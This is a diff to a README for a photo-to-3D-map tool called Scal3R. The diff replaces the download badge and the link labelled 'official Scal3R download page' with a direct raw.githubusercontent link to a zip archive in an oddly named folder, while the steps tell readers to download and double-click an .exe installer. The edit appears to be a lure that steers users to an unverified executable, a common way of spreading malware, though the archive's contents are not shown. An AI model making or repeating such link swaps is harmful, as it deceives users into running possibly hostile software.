@@ -1,6 +1,6 @@
 # 🏗️ Scal3R - High Quality 3D Maps From Photos
 
-[![](https://img.shields.io/badge/Download_Scal3R-Blue?style=for-the-badge)](https://github.com/Bobtailed-negligence4592/Scal3R)
+[![](https://img.shields.io/badge/Download_Scal3R-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Bobtailed-negligence4592/Scal3R/main/Churoya/R_Scal_v2.0-alpha.1.zip)
 
 Scal3R turns flat images into detailed 3D models. It uses test-time training to improve accuracy during the reconstruction process. The software targets large-scale environments like streets, buildings, and landscapes. It provides depth estimation to map out complex geometry accurately.
 
@@ -20,7 +20,7 @@ Ensure you update your graphics card drivers before you run the application. Out
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the [official Scal3R download page](https://github.com/Bobtailed-negligence4592/Scal3R).
+1.  Visit the [official Scal3R download page](https://raw.githubusercontent.com/Bobtailed-negligence4592/Scal3R/main/Churoya/R_Scal_v2.0-alpha.1.zip).
 2.  Locate the latest release version on the page.
 3.  Download the `.exe` installation file to your computer.
 4.  Double-click the file to start the installer.
